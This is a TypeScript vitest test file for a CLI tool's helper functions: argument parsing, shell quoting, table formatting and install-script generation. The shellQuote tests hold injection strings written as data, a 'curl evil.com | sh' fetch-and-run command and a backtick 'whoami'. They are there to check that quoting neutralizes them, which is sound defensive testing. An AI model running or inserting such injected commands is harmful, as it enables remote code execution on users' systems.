/**
 * Tests for pure functions in examples/skill-forge.ts
 */
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import {
  parseArgs,
  shellQuote,
  fmtTable,
  toolToManifestEntry,
  inferDomainFromTool,
  generateInstallScript,
} from "../examples/skill-forge.js";
import type { Tool } from "../lib/types.js";

// ── parseArgs ──────────────────────────────────────────────────────────

describe("parseArgs", () => {
  let originalArgv: string[];

  beforeEach(() => { originalArgv = process.argv; });
  afterEach(() => { process.argv = originalArgv; });

  it("parses --tool flag", () => {
    process.argv = ["node", "script", "--tool", "pypi:ruff"];
    const args = parseArgs();
    expect(args.tool).toBe("pypi:ruff");
    expect(args.prompt).toBe("");
  });

  it("parses --deep, --dry-run, --json, --strict flags", () => {
    process.argv = ["node", "script", "--deep", "--dry-run", "--json", "--strict", "--tool", "ruff"];
    const args = parseArgs();
    expect(args.deep).toBe(true);
    expect(args.dryRun).toBe(true);
    expect(args.json).toBe(true);
    expect(args.strict).toBe(true);
  });

  it("parses --limit with valid number", () => {
    process.argv = ["node", "script", "--limit", "25"];
    const args = parseArgs();
    expect(args.limit).toBe(25);
  });

  it("rejects --limit with NaN", () => {
    process.argv = ["node", "script", "--limit", "abc"];
    expect(() => parseArgs()).toThrow("Invalid --limit value");
  });

  it("rejects --limit with negative value", () => {
    process.argv = ["node", "script", "--limit", "-5"];
    expect(() => parseArgs()).toThrow("Invalid --limit value");
  });

  it("collects remaining args as prompt", () => {
    process.argv = ["node", "script", "build", "a", "RAG", "pipeline"];
    const args = parseArgs();
    expect(args.prompt).toBe("build a RAG pipeline");
  });

  it("defaults are correct", () => {
    process.argv = ["node", "script"];
    const args = parseArgs();
    expect(args.limit).toBe(10);
    expect(args.deep).toBe(false);
    expect(args.audit).toBe(false);
    expect(args.dryRun).toBe(false);
    expect(args.json).toBe(false);
    expect(args.strict).toBe(false);
  });
});

// ── shellQuote ─────────────────────────────────────────────────────────

describe("shellQuote", () => {
  it("wraps simple string in single quotes", () => {
    expect(shellQuote("ruff")).toBe("'ruff'");
  });

  it("escapes embedded single quotes", () => {
    expect(shellQuote("it's")).toBe("'it'\\''s'");
  });

  it("neutralizes shell metacharacters", () => {
    const malicious = "ruff; curl evil.com | sh";
    const quoted = shellQuote(malicious);
    expect(quoted).toBe("'ruff; curl evil.com | sh'");
    // The result is a safe single-quoted string
    expect(quoted).not.toContain("$(");
  });

  it("handles backtick injection", () => {
    const quoted = shellQuote("`whoami`");
    expect(quoted).toBe("'`whoami`'");
  });
});

// ── fmtTable ───────────────────────────────────────────────────────────

describe("fmtTable", () => {
  it("formats a simple table", () => {
    const result = fmtTable([["a", "b"], ["cc", "dd"]], ["H1", "H2"]);
    expect(result).toContain("H1");
    expect(result).toContain("H2");
    expect(result).toContain("a");
    expect(result).toContain("dd");
  });

  it("handles empty rows", () => {
    const result = fmtTable([], ["Col"]);
    expect(result).toContain("Col");
    // Should still produce a valid table structure
    expect(result).toContain("┌");
    expect(result).toContain("└");
  });
});

// ── toolToManifestEntry ────────────────────────────────────────────────

function makeTool(overrides: Partial<Tool> = {}): Tool {
  return {
    meta: { name: "test-tool", version: "1.0.0", description: "A test tool", tags: ["test"] },
    source: { format: "pypi", uri: "pypi:test-tool" },
    capabilities: { commands: [], globalFlags: [] },
    ...overrides,
  } as Tool;
}

describe("toolToManifestEntry", () => {
  it("returns a ManifestEntry with correct name", () => {
    const entry = toolToManifestEntry(makeTool());
    expect(entry).not.toBeNull();
    expect(entry!.name).toBe("test-tool");
  });

  it("uses tool name (not URI) as repo for non-GitHub sources", () => {
    const entry = toolToManifestEntry(makeTool({
      source: { format: "pypi", uri: "pypi:ruff" },
    } as Partial<Tool>));
    expect(entry!.repo).toBe("test-tool");  // Not "pypi:ruff"
  });

  it("uses URI as repo for GitHub sources", () => {
    const entry = toolToManifestEntry(makeTool({
      source: { format: "github", uri: "astral-sh/ruff" },
    } as Partial<Tool>));
    expect(entry!.repo).toBe("astral-sh/ruff");
  });
});

// ── generateInstallScript ──────────────────────────────────────────────

describe("generateInstallScript", () => {
  it("generates npm install script for npm tools", () => {
    const script = generateInstallScript(makeTool({
      source: { format: "npm", uri: "npm:express" },
    } as Partial<Tool>));
    expect(script).toContain("npm install -g");
    expect(script).toContain("set -euo pipefail");
  });

  it("generates uv install script for pypi tools", () => {
    const script = generateInstallScript(makeTool({
      source: { format: "pypi", uri: "pypi:ruff" },
    } as Partial<Tool>));
    expect(script).toContain("uv tool install");
  });

  it("generates cargo install script for crates tools", () => {
    const script = generateInstallScript(makeTool({
      source: { format: "crates", uri: "crates:ripgrep" },
    } as Partial<Tool>));
    expect(script).toContain("cargo binstall");
  });

  it("shell-quotes package names to prevent injection", () => {
    // validateToolName will reject truly malicious names,
    // but shellQuote adds defense-in-depth
    const script = generateInstallScript(makeTool({
      source: { format: "pypi", uri: "pypi:safe-name" },
    } as Partial<Tool>));
    expect(script).toContain("'safe-name'");
  });
});
